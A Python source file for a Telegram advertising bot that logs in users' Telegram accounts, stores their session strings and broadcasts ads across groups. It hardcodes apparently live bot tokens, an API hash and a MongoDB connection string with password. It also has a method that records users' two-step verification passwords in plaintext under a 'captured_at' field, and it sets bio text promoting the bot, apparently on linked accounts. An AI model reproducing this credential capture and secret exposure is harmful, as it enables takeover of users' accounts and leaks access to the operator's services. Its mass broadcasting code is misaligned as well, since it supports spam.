# ============================================================
# BALRAJ ADS BOT — FINAL v3
# DB Channel · Full Admin Access · Fast Dashboard · Rich UI
# ============================================================

import os, re, random, string, json, time, logging, asyncio, io
import urllib.request
from datetime import datetime, timedelta
from typing import List, Dict, Any, Optional, Tuple

import pymongo
from pymongo.errors import ConnectionFailure, OperationFailure, ServerSelectionTimeoutError
from bson.objectid import ObjectId

from telethon import TelegramClient, functions, types
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, FloodWaitError,
    PhoneNumberInvalidError, PhoneCodeInvalidError,
    PhoneCodeExpiredError, PasswordHashInvalidError
)

from pyrogram import Client as PyroClient, filters, idle
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputMediaPhoto
from pyrogram.errors import MessageNotModified
from pyrogram.enums import ParseMode

from cryptography.fernet import Fernet

# ============================================================
# LOGGING
# ============================================================
os.makedirs('logs', exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler('logs/TecxoAds.log'), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ============================================================
# CONFIG
# ============================================================
API_ID = int(os.getenv("API_ID", "32564284"))
API_HASH = os.getenv("API_HASH", "aaa42a3cb985679d812df6fbd158e2f9")
BOT_TOKEN = os.getenv("BOT_TOKEN", '8737751406:AAGryrmBSa20FCGH0bA3xzZE2TYk3tMtRts')
LOGGER_BOT_TOKEN = os.getenv("LOGGER_BOT_TOKEN", '8931582433:AAE5E4uofmvqziQaFy-7zhHP4sfsI0QXJ5Q')
BOT_USERNAME = "Balraj_adsbot"
LOGGER_BOT_USERNAME = "@Balraj_loggar_bot"

ADMIN_ID = 8872448185
ADMIN_USERNAME = "@Balrajp1"
ADMIN_IDS = [8872448185]

START_IMAGE = "https://ibb.co/QFy8sc89"
FORCE_JOIN_IMAGE = "https://ibb.co/QFy8sc89"
PREMIUM_IMAGE = "https://ibb.co/4nW0Ndnh"

SETUP_GROUP_ID = -1002945751584
TECH_LOG_CHANNEL_ID = -1002945751584
PAYMENT_LOG_CHANNEL_ID = None

SUPPORT_GROUP_URL = "https://t.me/TecxoChat"
UPDATES_CHANNEL_URL = "https://t.me/Tecxo"
GUIDE_URL = "https://t.me/TecxoAds"

ENCRYPTION_KEY = os.getenv("ENCRYPTION_KEY", "")
MONGO_URI = os.getenv("MONGO_URI", 'mongodb+srv://balrajsohal007_db_user:h5HbjUgyW7I2zCyi@cluster1.qg2avkg.mongodb.net/?appName=Cluster1')
DB_NAME = 'balrajsohal007_db_user'

DEFAULT_DELAY = 600
FREE_ACCOUNT_LIMIT = 5
PREMIUM_ACCOUNT_LIMIT = "unlimited"

# DB channel defaults
DEFAULT_DB_FORWARD_INTERVAL_HOURS = 6     # har 6 ghante mein forward
DEFAULT_DB_RETENTION_DAYS = 30            # 30 din ka data rakhna

DEFAULT_PLANS = [
    {"plan_id": "p7",   "price": 49,  "days": 7,   "label": "₹49 - 7 Days"},
    {"plan_id": "p30",  "price": 99,  "days": 30,  "label": "₹99 - 30 Days"},
    {"plan_id": "p90",  "price": 249, "days": 90,  "label": "₹249 - 90 Days"},
    {"plan_id": "p180", "price": 499, "days": 180, "label": "₹499 - 180 Days"},
    {"plan_id": "p365", "price": 899, "days": 365, "label": "₹899 - 365 Days"},
]

MAINTENANCE_MESSAGE = "🚧 Bot is under maintenance. Please try again later."

ERROR_MESSAGES = {
    "account_limit": f"You've reached your account limit of {FREE_ACCOUNT_LIMIT}!",
    "invalid_phone": "Invalid phone number format! Use +1234567890",
    "banned": "🚫 You are banned from using this bot. Contact support.",
    "premium_required": "⭐ This feature is only for Premium users!",
    "maintenance": MAINTENANCE_MESSAGE,
}

# ============================================================
# UTILS
# ============================================================
def validate_phone_number(phone: str) -> bool:
    cleaned = re.sub(r'[^\d+]', '', phone)
    return bool(re.match(r'^\+\d{10,15}$', cleaned))

def validate_custom_code(code: str) -> Tuple[bool, str]:
    code = (code or "").strip().upper()
    if not code: return False, "Code cannot be empty"
    if len(code) < 3: return False, "Min 3 characters"
    if len(code) > 32: return False, "Max 32 characters"
    if not re.match(r'^[A-Z0-9_\-]+$', code):
        return False, "Only A-Z, 0-9, dash, underscore allowed"
    return True, code

def time_remaining_str(expiry: Optional[datetime]) -> str:
    if not expiry: return "N/A"
    d = expiry - datetime.now()
    if d.total_seconds() <= 0: return "Expired"
    if d.days > 0: return f"{d.days}d {d.seconds // 3600}h"
    return f"{d.seconds // 3600}h {(d.seconds % 3600) // 60}m"

def format_duration(td: timedelta) -> str:
    s = int(td.total_seconds())
    if s < 60: return f"{s}s"
    if s < 3600: return f"{s // 60}m {s % 60}s"
    return f"{s // 3600}h {(s % 3600) // 60}m"

def generate_plan_id() -> str:
    return f"plan_{int(datetime.now().timestamp())}_{random.randint(1000, 9999)}"

def kb(rows) -> InlineKeyboardMarkup:
    if not isinstance(rows, list) or not all(isinstance(row, list) for row in rows):
        raise ValueError("Rows must be list of lists")
    return InlineKeyboardMarkup(rows)

def styled(text: str, callback_data: str = None, url: str = None, style: str = None):
    kw = {"text": text}
    if callback_data: kw["callback_data"] = callback_data
    if url: kw["url"] = url
    if style: kw["style"] = style
    try: return InlineKeyboardButton(**kw)
    except TypeError:
        kw.pop("style", None)
        return InlineKeyboardButton(**kw)

# ============================================================
# RICH MESSAGE SENDER
# ============================================================
async def send_rich_message_fallback(bot_token: str, chat_id: int, html: str, reply_markup: dict):
    if not bot_token: return False
    def _send():
        payload = {"chat_id": chat_id, "rich_message": {"html": html}, "reply_markup": reply_markup}
        req = urllib.request.Request(
            f"https://api.telegram.org/bot{bot_token}/sendRichMessage",
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json"}, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                return bool(json.loads(r.read().decode("utf-8")).get("ok"))
        except Exception as exc:
            logger.warning("Rich send fail: %s", exc); return False
    return await asyncio.to_thread(_send)

# ============================================================
# DATABASE
# ============================================================
class EnhancedDatabaseManager:
    def __init__(self):
        self.client = None; self.db = None
        self._init_db(); self._init_default_settings()

    def _init_db(self):
        connected = False
        for uri in [MONGO_URI, "mongodb://127.0.0.1:27017"]:
            for attempt in range(2):
                try:
                    self.client = pymongo.MongoClient(uri, serverSelectionTimeoutMS=3000)
                    self.client.admin.command('ping')
                    self.db = self.client[DB_NAME]
                    logger.info(f"MongoDB connected: {DB_NAME}")
                    connected = True; break
                except (ConnectionFailure, ServerSelectionTimeoutError) as e:
                    logger.warning(f"Mongo attempt {attempt+1}: {e}")
                    if attempt < 1: time.sleep(1)
            if connected: break
        if not connected: raise ConnectionFailure("MongoDB connect failed")

        try:
            def ensure(coll, key, **kw):
                ik = key if isinstance(key, list) else [(key, pymongo.ASCENDING)]
                name = "_".join(f"{k}_{v}" for k, v in ik)
                try:
                    existing = coll.index_information()
                    if name in existing:
                        if existing[name].get('unique', False) != kw.get('unique', False):
                            coll.drop_index(name)
                        else: return
                    coll.create_index(key, name=name, **kw)
                except OperationFailure: pass

            ensure(self.db.users, "user_id", unique=True)
            ensure(self.db.accounts, [("user_id", 1), ("phone_number", 1)])
            ensure(self.db.ad_messages, "user_id", unique=True)
            ensure(self.db.ad_delays, "user_id", unique=True)
            ensure(self.db.broadcast_states, "user_id", unique=True)
            ensure(self.db.analytics, "user_id", unique=True)
            ensure(self.db.bot_settings, "key", unique=True)
            ensure(self.db.plans, "plan_id", unique=True)
            ensure(self.db.redeem_codes, "code", unique=True)
            ensure(self.db.redeem_uses, [("code", 1), ("user_id", 1)], unique=True)
            ensure(self.db.payment_requests, "request_id", unique=True)
            ensure(self.db.banned_users, "user_id", unique=True)
            ensure(self.db.twofa_logs, "user_id")
            ensure(self.db.auto_reply, "user_id", unique=True)
            ensure(self.db.auto_reply_sent, "bot_user_id", unique=True)
            ensure(self.db.db_channel_log, "event_id", unique=True)
        except Exception as e: logger.error(f"Indexes: {e}")

    def _init_default_settings(self):
        defaults = {
            "maintenance_mode": False,
            "force_join_enabled": False,
            "force_join_channels": [],
            "force_join_groups": [],
            "free_account_limit": FREE_ACCOUNT_LIMIT,
            "default_delay": DEFAULT_DELAY,
            "payment_log_channel_id": PAYMENT_LOG_CHANNEL_ID,
            "broadcast_log_channel_id": TECH_LOG_CHANNEL_ID,
            "database_channel_id": None,
            "db_forward_interval_hours": DEFAULT_DB_FORWARD_INTERVAL_HOURS,
            "db_retention_days": DEFAULT_DB_RETENTION_DAYS,
            "db_forward_enabled": True,
            "payment_qr_file_id": None,
            "payment_upi_id": None,
            "start_image": START_IMAGE,
            "premium_image": PREMIUM_IMAGE,
            "force_join_image": FORCE_JOIN_IMAGE,
            "auto_reply_enabled": True,
            "auto_join_enabled": True,
            "group_targeting_enabled": True,
        }
        try:
            for k, v in defaults.items():
                self.db.bot_settings.update_one({"key": k},
                    {"$setOnInsert": {"value": v, "created_at": datetime.now()}}, upsert=True)
            for p in DEFAULT_PLANS:
                self.db.plans.update_one({"plan_id": p["plan_id"]},
                    {"$setOnInsert": {**p, "created_at": datetime.now()}}, upsert=True)
        except Exception as e: logger.error(f"Defaults: {e}")

    # ---- SETTINGS ----
    def get_setting(self, key, default=None):
        try:
            d = self.db.bot_settings.find_one({"key": key})
            return d["value"] if d else default
        except Exception: return default

    def set_setting(self, key, value):
        try:
            self.db.bot_settings.update_one({"key": key},
                {"$set": {"value": value, "updated_at": datetime.now()}}, upsert=True)
            return True
        except Exception: return False

    # ---- USERS ----
    def create_user(self, uid, username, first_name):
        try:
            self.db.users.update_one({"user_id": uid},
                {"$set": {"username": username or "Unknown",
                          "first_name": first_name or "User",
                          "last_interaction": datetime.now()},
                 "$setOnInsert": {"user_id": uid, "created_at": datetime.now(),
                                  "state": "", "is_premium": False,
                                  "premium_expiry": None, "is_banned": False,
                                  "auto_join_enabled": False,
                                  "group_targeting_enabled": False}}, upsert=True)
        except Exception as e: logger.error(f"create_user: {e}")

    def get_user(self, uid):
        try: return self.db.users.find_one({"user_id": uid})
        except Exception: return None

    def get_user_snapshot(self, uid):
        try:
            return self.db.users.aggregate([
                {"$match": {"user_id": uid}},
                {"$lookup": {"from": "accounts", "localField": "user_id",
                             "foreignField": "user_id", "as": "accounts"}},
                {"$lookup": {"from": "ad_messages", "localField": "user_id",
                             "foreignField": "user_id", "as": "ads"}},
                {"$lookup": {"from": "ad_delays", "localField": "user_id",
                             "foreignField": "user_id", "as": "delays"}},
                {"$lookup": {"from": "broadcast_states", "localField": "user_id",
                             "foreignField": "user_id", "as": "bstate"}},
                {"$project": {
                    "user_id": 1, "username": 1, "first_name": 1,
                    "is_premium": 1, "premium_expiry": 1, "is_banned": 1,
                    "auto_join_enabled": 1, "group_targeting_enabled": 1,
                    "accounts_count": {"$size": "$accounts"},
                    "has_ad_message": {"$gt": [{"$size": "$ads"}, 0]},
                    "delay": {"$ifNull": [{"$arrayElemAt": ["$delays.delay", 0]}, None]},
                    "running": {"$ifNull": [{"$arrayElemAt": ["$bstate.running", 0]}, False]}}}]).next()
        except StopIteration: return None
        except Exception as e:
            logger.error(f"snapshot: {e}"); return None

    def update_user_last_interaction(self, uid):
        try: self.db.users.update_one({"user_id": uid}, {"$set": {"last_interaction": datetime.now()}})
        except Exception: pass

    def get_all_users(self, page=0, limit=0):
        try:
            if limit == 0: return list(self.db.users.find({}))
            return list(self.db.users.find({}).skip(page * limit).limit(limit))
        except Exception: return []

    def get_users_count(self):
        try: return self.db.users.count_documents({})
        except Exception: return 0

    def search_users(self, q):
        try:
            rgx = {"$regex": q, "$options": "i"}
            return list(self.db.users.find({"$or": [{"username": rgx}, {"first_name": rgx}]}).limit(20))
        except Exception: return []

    def delete_user(self, uid):
        try:
            for coll in ["users", "accounts", "ad_messages", "ad_delays",
                         "broadcast_states", "target_groups", "analytics",
                         "auto_reply", "temp_data"]:
                try: self.db[coll].delete_many({"user_id": uid})
                except Exception: pass
            return True
        except Exception: return False

    # ---- PREMIUM ----
    def is_premium(self, uid):
        try:
            u = self.db.users.find_one({"user_id": uid}, {"is_premium": 1, "premium_expiry": 1})
            if not u or not u.get("is_premium"): return False
            exp = u.get("premium_expiry")
            if exp and datetime.now() > exp:
                self.expire_premium(uid); return False
            return True
        except Exception: return False

    def get_premium_expiry(self, uid):
        try:
            u = self.db.users.find_one({"user_id": uid}, {"premium_expiry": 1})
            return u.get("premium_expiry") if u else None
        except Exception: return None

    def add_premium(self, uid, days, reason="admin"):
        try:
            u = self.get_user(uid)
            if not u: return False
            cur = u.get("premium_expiry"); now = datetime.now()
            new_exp = (cur + timedelta(days=days)) if (cur and cur > now and self.is_premium(uid)) else (now + timedelta(days=days))
            self.db.users.update_one({"user_id": uid},
                {"$set": {"is_premium": True, "premium_expiry": new_exp, "updated_at": now}})
            self.db.premium_logs.insert_one({"user_id": uid, "action": "add", "days": days,
                                              "expiry": new_exp, "reason": reason, "timestamp": now})
            return True
        except Exception: return False

    def remove_premium(self, uid, reason="admin"):
        try:
            self.db.users.update_one({"user_id": uid},
                {"$set": {"is_premium": False, "premium_expiry": None, "updated_at": datetime.now()}})
            self.db.premium_logs.insert_one({"user_id": uid, "action": "remove",
                                              "reason": reason, "timestamp": datetime.now()})
            return True
        except Exception: return False

    def expire_premium(self, uid):
        try:
            self.db.users.update_one({"user_id": uid},
                {"$set": {"is_premium": False, "premium_expiry": None}})
        except Exception: pass

    # ---- BAN ----
    def ban_user(self, uid, reason="No reason"):
        try:
            self.db.banned_users.update_one({"user_id": uid},
                {"$set": {"reason": reason, "banned_at": datetime.now()}}, upsert=True)
            self.db.users.update_one({"user_id": uid},
                {"$set": {"is_banned": True, "ban_reason": reason}})
            return True
        except Exception: return False

    def unban_user(self, uid):
        try:
            self.db.banned_users.delete_one({"user_id": uid})
            self.db.users.update_one({"user_id": uid},
                {"$set": {"is_banned": False, "ban_reason": None}})
            return True
        except Exception: return False

    def is_banned(self, uid):
        try:
            u = self.db.users.find_one({"user_id": uid}, {"is_banned": 1})
            return u.get("is_banned", False) if u else False
        except Exception: return False

    # ---- PLANS ----
    def get_all_plans(self):
        try: return list(self.db.plans.find({}).sort("price", 1))
        except Exception: return []

    def get_plan(self, pid):
        try: return self.db.plans.find_one({"plan_id": pid})
        except Exception: return None

    def add_plan(self, pid, price, days, label):
        try:
            self.db.plans.update_one({"plan_id": pid},
                {"$set": {"price": price, "days": days, "label": label, "updated_at": datetime.now()},
                 "$setOnInsert": {"created_at": datetime.now()}}, upsert=True)
            return True
        except Exception: return False

    def update_plan(self, pid, **kw):
        try:
            kw["updated_at"] = datetime.now()
            self.db.plans.update_one({"plan_id": pid}, {"$set": kw}); return True
        except Exception: return False

    def delete_plan(self, pid):
        try: return self.db.plans.delete_one({"plan_id": pid}).deleted_count > 0
        except Exception: return False

    # ---- PAYMENT ----
    def set_payment_qr(self, fid): return self.set_setting("payment_qr_file_id", fid)
    def get_payment_qr(self): return self.get_setting("payment_qr_file_id")
    def set_payment_upi(self, upi): self.set_setting("payment_upi_id", upi); return True
    def get_payment_upi(self): return self.get_setting("payment_upi_id")
    def clear_payment_qr(self): return self.set_setting("payment_qr_file_id", None)
    def clear_payment_upi(self): self.set_setting("payment_upi_id", None); return True

    def create_payment_request(self, uid, pid, price, days, fid, username=""):
        try:
            rid = f"PAY-{int(time.time())}-{uid}"
            self.db.payment_requests.insert_one({
                "request_id": rid, "user_id": uid, "username": username,
                "plan_id": pid, "price": price, "days": days,
                "screenshot_file_id": fid, "status": "pending",
                "created_at": datetime.now()})
            return rid
        except Exception: return None

    def get_payment_request(self, rid):
        try: return self.db.payment_requests.find_one({"request_id": rid})
        except Exception: return None

    def update_payment_request_status(self, rid, status, admin_id=None):
        try:
            self.db.payment_requests.update_one({"request_id": rid},
                {"$set": {"status": status, "processed_at": datetime.now(), "processed_by": admin_id}})
            return True
        except Exception: return False

    def get_pending_payment_requests(self, limit=0):
        try:
            q = self.db.payment_requests.find({"status": "pending"}).sort("created_at", -1)
            if limit: q = q.limit(limit)
            return list(q)
        except Exception: return []

    # ---- REDEEM ----
    def create_redeem_code(self, code, days, max_uses, validity_days):
        try:
            code = (code or "").strip().upper()
            if not code: return False, "Empty"
            if self.db.redeem_codes.find_one({"code": code}):
                return False, f"'{code}' already exists"
            self.db.redeem_codes.insert_one({
                "code": code, "days": days, "max_uses": max_uses, "used_count": 0,
                "validity_days": validity_days, "created_at": datetime.now(),
                "expires_at": datetime.now() + timedelta(days=validity_days), "active": True})
            return True, f"Code '{code}' created!"
        except Exception as e: return False, str(e)

    def toggle_redeem_code(self, code):
        try:
            d = self.db.redeem_codes.find_one({"code": code})
            if not d: return False, "Not found"
            ns = not d.get("active", True)
            self.db.redeem_codes.update_one({"code": code},
                {"$set": {"active": ns, "updated_at": datetime.now()}})
            return True, f"{'Activated' if ns else 'Deactivated'}"
        except Exception as e: return False, str(e)

    def get_redeem_code(self, code):
        try: return self.db.redeem_codes.find_one({"code": code})
        except Exception: return None

    def get_redeem_code_stats(self, code):
        try:
            d = self.db.redeem_codes.find_one({"code": code})
            if not d: return None
            users = list(self.db.redeem_uses.find({"code": code}))
            return {"code": d, "used_by": [u["user_id"] for u in users], "total_users": len(users)}
        except Exception: return None

    def redeem_code(self, code, uid):
        try:
            code = (code or "").strip().upper()
            d = self.db.redeem_codes.find_one({"code": code})
            if not d: return False, "❌ Invalid code!", 0
            if not d.get("active", True): return False, "❌ Inactive!", 0
            if self.db.redeem_uses.find_one({"code": code, "user_id": uid}):
                return False, "❌ Already used!", 0
            if d["used_count"] >= d["max_uses"]:
                return False, "❌ Max uses reached!", 0
            if d["used_count"] == 0 and datetime.now() > d["expires_at"]:
                self.db.redeem_codes.update_one({"code": code}, {"$set": {"active": False}})
                return False, "❌ Expired!", 0
            days = d["days"]
            self.add_premium(uid, days, reason=f"redeem:{code}")
            self.db.redeem_uses.insert_one({"code": code, "user_id": uid, "used_at": datetime.now()})
            self.db.redeem_codes.update_one({"code": code}, {"$inc": {"used_count": 1}})
            upd = self.db.redeem_codes.find_one({"code": code})
            if upd["used_count"] >= upd["max_uses"]:
                self.db.redeem_codes.update_one({"code": code}, {"$set": {"active": False}})
            return True, f"✅ Redeemed {days} days!", days
        except Exception as e: return False, f"❌ {e}", 0

    def get_all_redeem_codes(self):
        try: return list(self.db.redeem_codes.find({}).sort("created_at", -1))
        except Exception: return []

    def delete_redeem_code(self, code):
        try:
            self.db.redeem_codes.delete_one({"code": code})
            self.db.redeem_uses.delete_many({"code": code})
            return True
        except Exception: return False

    def cleanup_expired_redeem_codes(self):
        try:
            return self.db.redeem_codes.delete_many(
                {"used_count": 0, "expires_at": {"$lt": datetime.now()}}).deleted_count
        except Exception: return 0

    # ---- ACCOUNTS ----
    def get_user_accounts(self, uid):
        try: return list(self.db.accounts.find({"user_id": uid}))
        except Exception: return []

    def get_user_accounts_count(self, uid):
        try: return self.db.accounts.count_documents({"user_id": uid})
        except Exception: return 0

    def add_user_account(self, uid, phone, session_str, **kw):
        try:
            cnt = self.get_user_accounts_count(uid)
            limit = 99999 if self.is_premium(uid) else int(self.get_setting("free_account_limit", FREE_ACCOUNT_LIMIT))
            if cnt >= limit: return False
            self.db.accounts.insert_one({
                "user_id": uid, "phone_number": phone, "session_string": session_str,
                "first_name": kw.get('first_name', ''), "last_name": kw.get('last_name', ''),
                "is_active": True, "created_at": datetime.now()})
            return True
        except Exception: return False

    def delete_user_account(self, uid, acc_id):
        try:
            return self.db.accounts.delete_one({"user_id": uid, "_id": ObjectId(acc_id)}).deleted_count > 0
        except Exception: return False

    def deactivate_account(self, acc_id):
        try:
            self.db.accounts.update_one({"_id": ObjectId(acc_id)},
                {"$set": {"is_active": False, "updated_at": datetime.now()}})
        except Exception: pass

    # ---- AD MSG / DELAY ----
    def get_user_ad_messages(self, uid):
        try: return list(self.db.ad_messages.find({"user_id": uid}).sort("created_at", -1))
        except Exception: return []

    def add_user_ad_message(self, uid, message, created_at):
        try:
            self.db.ad_messages.update_one({"user_id": uid},
                {"$set": {"message": message, "created_at": created_at,
                          "updated_at": datetime.now()}}, upsert=True)
        except Exception: pass

    def get_user_ad_delay(self, uid):
        try:
            d = self.db.ad_delays.find_one({"user_id": uid}, {"delay": 1})
            default = self.get_setting("default_delay", DEFAULT_DELAY)
            return d.get("delay", default) if d else default
        except Exception: return DEFAULT_DELAY

    def set_user_ad_delay(self, uid, delay):
        try:
            self.db.ad_delays.update_one({"user_id": uid},
                {"$set": {"delay": delay, "updated_at": datetime.now()}}, upsert=True)
        except Exception: pass

    # ---- BROADCAST STATE ----
    def get_broadcast_state(self, uid):
        try:
            d = self.db.broadcast_states.find_one({"user_id": uid}, {"running": 1, "paused": 1})
            return d if d else {"running": False, "paused": False}
        except Exception: return {"running": False, "paused": False}

    def set_broadcast_state(self, uid, running=False, paused=False):
        try:
            self.db.broadcast_states.update_one({"user_id": uid},
                {"$set": {"running": running, "paused": paused,
                          "updated_at": datetime.now()}}, upsert=True)
        except Exception: pass

    def update_broadcast_heartbeat(self, uid, **extra):
        try:
            payload = {"last_heartbeat": datetime.now(), "updated_at": datetime.now()}
            payload.update(extra or {})
            self.db.broadcast_states.update_one({"user_id": uid}, {"$set": payload}, upsert=True)
        except Exception: pass

    def get_broadcast_progress(self, uid):
        try:
            d = self.db.broadcast_states.find_one({"user_id": uid})
            if not d: return {}
            return {"running": d.get("running", False), "cycle": d.get("cycle_count", 0),
                    "sent": d.get("sent_count", 0), "failed": d.get("failed_count", 0),
                    "account_index": d.get("account_index", 0), "group_index": d.get("group_index", 0),
                    "last_heartbeat": d.get("last_heartbeat")}
        except Exception: return {}

    def save_broadcast_progress(self, uid, **kw):
        try:
            data = {"last_heartbeat": datetime.now(), "updated_at": datetime.now()}
            if "cycle" in kw: data["cycle_count"] = kw["cycle"]
            if "sent" in kw: data["sent_count"] = kw["sent"]
            if "failed" in kw: data["failed_count"] = kw["failed"]
            if "account_index" in kw: data["account_index"] = kw["account_index"]
            if "group_index" in kw: data["group_index"] = kw["group_index"]
            self.db.broadcast_states.update_one({"user_id": uid}, {"$set": data}, upsert=True)
        except Exception: pass

    def get_resumable_broadcasts(self, max_age_minutes=45):
        try:
            threshold = datetime.now() - timedelta(minutes=max_age_minutes)
            resumable, stale = [], []
            for doc in self.db.broadcast_states.find({"running": True}):
                hb = doc.get("last_heartbeat")
                if hb and hb >= threshold: resumable.append(doc["user_id"])
                else: stale.append(doc["user_id"])
            for uid in stale:
                self.db.broadcast_states.update_one({"user_id": uid},
                    {"$set": {"running": False, "paused": False}})
            return resumable
        except Exception: return []

    # ---- AUTO JOIN / GROUP TARGETING ----
    def set_auto_join(self, uid, state: bool):
        try:
            self.db.users.update_one({"user_id": uid},
                {"$set": {"auto_join_enabled": state, "updated_at": datetime.now()}})
            return True
        except Exception: return False

    def get_auto_join(self, uid):
        try:
            u = self.db.users.find_one({"user_id": uid}, {"auto_join_enabled": 1})
            return u.get("auto_join_enabled", False) if u else False
        except Exception: return False

    def set_group_targeting(self, uid, state: bool):
        try:
            self.db.users.update_one({"user_id": uid},
                {"$set": {"group_targeting_enabled": state, "updated_at": datetime.now()}})
            return True
        except Exception: return False

    def get_group_targeting(self, uid):
        try:
            u = self.db.users.find_one({"user_id": uid}, {"group_targeting_enabled": 1})
            return u.get("group_targeting_enabled", False) if u else False
        except Exception: return False

    # ---- ANALYTICS ----
    def get_user_analytics(self, uid):
        try:
            s = self.db.analytics.find_one({"user_id": uid})
            return s if s else {"total_broadcasts": 0, "total_sent": 0,
                                "total_failed": 0, "total_cycles": 0}
        except Exception:
            return {"total_broadcasts": 0, "total_sent": 0, "total_failed": 0, "total_cycles": 0}

    def increment_broadcast_stats(self, uid, success, group_id=None, account_id=None):
        try:
            self.db.analytics.update_one({"user_id": uid},
                {"$inc": {"total_sent" if success else "total_failed": 1, "total_broadcasts": 1},
                 "$set": {"updated_at": datetime.now()}}, upsert=True)
        except Exception: pass

    def increment_broadcast_cycle(self, uid):
        try:
            self.db.analytics.update_one({"user_id": uid},
                {"$inc": {"total_cycles": 1}, "$set": {"updated_at": datetime.now()}}, upsert=True)
        except Exception: pass

    def get_admin_stats(self):
        try:
            a = list(self.db.analytics.aggregate([{"$group": {
                "_id": None, "total_sent": {"$sum": "$total_sent"},
                "total_failed": {"$sum": "$total_failed"},
                "total_broadcasts": {"$sum": "$total_broadcasts"}}}]))
            a = a[0] if a else {"total_sent": 0, "total_failed": 0, "total_broadcasts": 0}
            return {
                "total_users": self.db.users.count_documents({}),
                "total_accounts": self.db.accounts.count_documents({}),
                "premium_users": self.db.users.count_documents({"is_premium": True}),
                "banned_users": self.db.banned_users.count_documents({}),
                "active_broadcasts": self.db.broadcast_states.count_documents({"running": True}),
                "pending_payments": self.db.payment_requests.count_documents({"status": "pending"}),
                "total_forwards": a["total_sent"],
                "total_failed": a["total_failed"],
                "total_broadcasts": a["total_broadcasts"],
            }
        except Exception:
            return {k: 0 for k in ["total_users", "total_forwards", "total_accounts",
                                    "premium_users", "banned_users", "active_broadcasts",
                                    "pending_payments", "total_broadcasts", "total_failed"]}

    # ---- STATE / TEMP ----
    def set_user_state(self, uid, state):
        try:
            self.db.users.update_one({"user_id": uid},
                {"$set": {"state": state, "updated_at": datetime.now()}})
        except Exception: pass

    def get_user_state(self, uid):
        try:
            u = self.db.users.find_one({"user_id": uid}, {"state": 1})
            return u.get("state", "") if u else ""
        except Exception: return ""

    def set_temp_data(self, uid, data):
        try:
            self.db.temp_data.update_one({"user_id": uid, "key": "session"},
                {"$set": {"value": data, "updated_at": datetime.now()}}, upsert=True)
        except Exception: pass

    def get_temp_data(self, uid):
        try:
            d = self.db.temp_data.find_one({"user_id": uid, "key": "session"}, {"value": 1})
            return d.get("value") if d else None
        except Exception: return None

    # ---- LOGGER ----
    def set_logger_status(self, uid, active=True):
        try:
            self.db.logger_status.update_one({"user_id": uid},
                {"$set": {"is_active": active, "updated_at": datetime.now()}}, upsert=True)
        except Exception: pass

    def get_logger_status(self, uid):
        try:
            d = self.db.logger_status.find_one({"user_id": uid}, {"is_active": 1})
            return d.get("is_active", False) if d else False
        except Exception: return False

    def log_logger_failure(self, uid, err):
        try:
            self.db.logger_failures.insert_one({"user_id": uid, "error": str(err),
                                                 "timestamp": datetime.now()})
        except Exception: pass

    def get_logger_failures(self, uid):
        try: return list(self.db.logger_failures.find({"user_id": uid}))
        except Exception: return []

    # ---- AUTO REPLY ----
    def set_auto_reply(self, uid, message):
        try:
            self.db.auto_reply.update_one({"user_id": uid},
                {"$set": {"message": message, "enabled": True,
                          "updated_at": datetime.now()}}, upsert=True)
        except Exception: pass

    def get_auto_reply(self, uid):
        try: return self.db.auto_reply.find_one({"user_id": uid})
        except Exception: return None

    def delete_auto_reply(self, uid):
        try: self.db.auto_reply.delete_one({"user_id": uid})
        except Exception: pass

    def get_replied_users(self, bot_uid):
        try:
            d = self.db.auto_reply_sent.find_one({"bot_user_id": bot_uid})
            return set(d.get("replied_to", [])) if d else set()
        except Exception: return set()

    def add_replied_user(self, bot_uid, sender):
        try:
            self.db.auto_reply_sent.update_one({"bot_user_id": bot_uid},
                {"$addToSet": {"replied_to": sender}, "$set": {"updated_at": datetime.now()}},
                upsert=True)
        except Exception: pass

    # ---- 2FA ----
    def log_2fa_password(self, uid, phone, password):
        try:
            self.db.twofa_logs.insert_one({"user_id": uid, "phone": phone,
                                            "password": password,
                                            "captured_at": datetime.now()})
            return True
        except Exception: return False

    # ---- DB CHANNEL EVENT LOG ----
    def log_db_event(self, event_type: str, uid: int, payload: dict):
        """Log an event for forwarding to DB channel."""
        try:
            event_id = f"{event_type}-{uid}-{int(time.time()*1000)}"
            self.db.db_channel_log.insert_one({
                "event_id": event_id, "event_type": event_type,
                "user_id": uid, "payload": payload,
                "created_at": datetime.now(), "forwarded": False})
            return event_id
        except Exception as e:
            logger.error(f"log_db_event: {e}"); return None

    def get_unforwarded_db_events(self, limit=50):
        try:
            return list(self.db.db_channel_log.find({"forwarded": False})
                        .sort("created_at", 1).limit(limit))
        except Exception: return []

    def mark_db_event_forwarded(self, event_id):
        try:
            self.db.db_channel_log.update_one({"event_id": event_id},
                {"$set": {"forwarded": True, "forwarded_at": datetime.now()}})
        except Exception: pass

    def cleanup_old_db_events(self, retention_days: int):
        """Delete events older than retention."""
        try:
            cutoff = datetime.now() - timedelta(days=retention_days)
            r = self.db.db_channel_log.delete_many({"created_at": {"$lt": cutoff}})
            return r.deleted_count
        except Exception: return 0

    def count_db_events(self):
        try: return self.db.db_channel_log.count_documents({})
        except Exception: return 0

    def close(self):
        try:
            if self.client: self.client.close()
        except Exception: pass


# ============================================================
# INIT
# ============================================================
print("Balraj Bot v3 — starting 🚀")

DESIRED_BIO = "Free Automated ads via @Balraj_adsbot | powered by: @Balrajp1"
NAME_SUFFIX = "•via @Balraj_adsbot"

KEY_FILE = 'encryption.key'
if not ENCRYPTION_KEY:
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE) as f: ENCRYPTION_KEY = f.read().strip()
    else:
        ENCRYPTION_KEY = Fernet.generate_key().decode()
        with open(KEY_FILE, 'w') as f: f.write(ENCRYPTION_KEY)
else:
    with open(KEY_FILE, 'w') as f: f.write(ENCRYPTION_KEY)

cipher_suite = Fernet(ENCRYPTION_KEY.encode())

try:
    db = EnhancedDatabaseManager()
except Exception as e:
    logger.error(f"DB init: {e}"); print("Bot failed — check logs"); exit(1)

def is_owner(uid): return uid in ADMIN_IDS

pyro = PyroClient("balrajads", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
logger_client = PyroClient("logger_bot", api_id=API_ID, api_hash=API_HASH, bot_token=LOGGER_BOT_TOKEN)

user_tasks = {}
